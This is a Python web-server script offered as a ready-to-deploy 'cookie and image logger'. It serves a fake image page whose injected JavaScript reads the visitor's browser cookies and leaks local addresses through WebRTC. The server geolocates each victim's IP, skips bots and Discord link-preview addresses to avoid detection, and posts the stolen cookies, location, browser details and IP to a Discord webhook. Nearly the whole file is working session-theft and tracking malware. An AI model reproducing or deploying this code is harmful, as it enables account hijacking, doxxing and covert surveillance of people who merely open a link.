# 2026 Cookie + Image Logger - Vercel / Render Compatible
# Grabs document.cookie via JS + sends to webhook
# Also keeps IP / UA / WebRTC / geo tricks

from http.server import BaseHTTPRequestHandler
import urllib.parse, json, requests, base64, traceback
import httpagentparser
from datetime import datetime

# ────────────────────────────────────────────── CONFIG ──────────────────────────────────────────────
config = {
    "webhook": "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN_HERE",
    "image_url": "https://example.com/your-image-or-fake-loading.jpg",
    "username": "Cookie Ghost 2026 🍪👻",
    "color": 0xFF1493,  # deep pink
    "bugged_preview": True,
    "webrtc_leak": True,
    "grab_cookies": True,  # main new feature
    "anti_bot": 2,
    "vpn_check": 1,
    "redirect_url": "https://google.com",
    "redirect_enabled": False,
}

blacklist_starts = ("34.", "35.", "162.", "104.")

# Helpers (same as before – is_bot_or_proxy, get_victim_info, send_webhook)
def is_bot_or_proxy(ip, ua):
    if any(ip.startswith(x) for x in blacklist_starts):
        return "Discord/Proxy"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,proxy,hosting,isp").json()
        if info.get("proxy") or info.get("hosting"):
            return "VPN/Hosting" if info["proxy"] else "Bot?"
    except:
        pass
    return False

def send_webhook(embed, ping=False):
    payload = {"username": config["username"], "embeds": [embed], "content": "@everyone" if ping else ""}
    requests.post(config["webhook"], json=payload)

def get_victim_info(ip, ua):
    try:
        data = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        os, browser = httpagentparser.simple_detect(ua)
        return {
            "ip": ip, "isp": data.get("isp","?"), "country": data.get("country","?"),
            "city": data.get("city","?"), "coords": f"{data.get('lat','?')},{data.get('lon','?')}",
            "proxy": data.get("proxy",False), "os": os, "browser": browser, "ua": ua
        }
    except:
        return {"ip": ip, "ua": ua}

class CookieLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
            ua = self.headers.get('User-Agent', 'Unknown')
            bot = is_bot_or_proxy(ip, ua)
            parsed = urllib.parse.urlparse(self.path)
            qs = urllib.parse.parse_qs(parsed.query)

            img = config["image_url"]
            if "img" in qs:
                try: img = base64.b64decode(qs["img"][0]).decode()
                except: pass

            if bot:
                if config["bugged_preview"]:
                    self.send_response(200)
                    self.send_header("Content-type", "image/jpeg")
                    self.end_headers()
                    self.wfile.write(b"\xFF\xD8\xFF\xE0")  # fake jpeg start
                send_webhook({"title": "Bot/Link Sent", "description": f"IP: `{ip}` UA: `{ua[:80]}`"}, ping=False)
                self.send_response(302)
                self.send_header("Location", img)
                self.end_headers()
                return

            victim = get_victim_info(ip, ua)
            ping = "@everyone"
            if victim.get("proxy") and config["vpn_check"] >= 1:
                ping = "" if config["vpn_check"] == 1 else None

            cookie_data = ""
            if config["grab_cookies"] and "cookies" in qs:
                try:
                    cookie_data = base64.b64decode(qs["cookies"][0]).decode('utf-8', errors='ignore')
                except:
                    cookie_data = "Decode failed"

            embed = {
                "title": "Cookie Grab Hit 🍪",
                "color": config["color"],
                "description": f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
                               f"**IP:** `{victim['ip']}`\n"
                               f"**Location:** {victim.get('city','?')}, {victim.get('country','?')}\n"
                               f"**Browser/OS:** {victim['browser']} on {victim['os']}\n"
                               f"**UA:** ```{victim['ua'][:200]}...```\n"
                               f"**Cookies (base64 sent):** ```{cookie_data[:300]}...```" if cookie_data else "No cookies grabbed",
                "thumbnail": {"url": img}
            }
            send_webhook(embed, ping=bool(ping))

            # JS to grab & send cookies + WebRTC leak
            js = ""
            if config["webrtc_leak"]:
                js += """
const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
pc.onicecandidate = e => { if(e.candidate) fetch('?leak='+btoa(e.candidate.candidate),{method:'HEAD'}); };
pc.createOffer().then(o=>pc.setLocalDescription(o));
"""

            if config["grab_cookies"]:
                js += """
const ck = document.cookie;
if(ck){
  fetch(location.href + (location.search?'&':'?') + 'cookies=' + btoa(ck), {method:'HEAD'});
}
"""

            html = f"""
<!DOCTYPE html>
<html><body style="margin:0;background:#000;">
<div style="height:100vh;background:url('{img}') center/contain no-repeat;"></div>
<script>{js}</script>
</body></html>
""".encode()

            if config["redirect_enabled"]:
                html = f'<meta http-equiv="refresh" content="0;url={config["redirect_url"]}">'.encode() + html

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(html)

        except Exception:
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Server oof")

    do_POST = do_GET

if __name__ == "__main__":
    print("Cookie logger on :8080")
    from http.server import HTTPServer
    HTTPServer(('', 8080), CookieLogger).serve_forever()
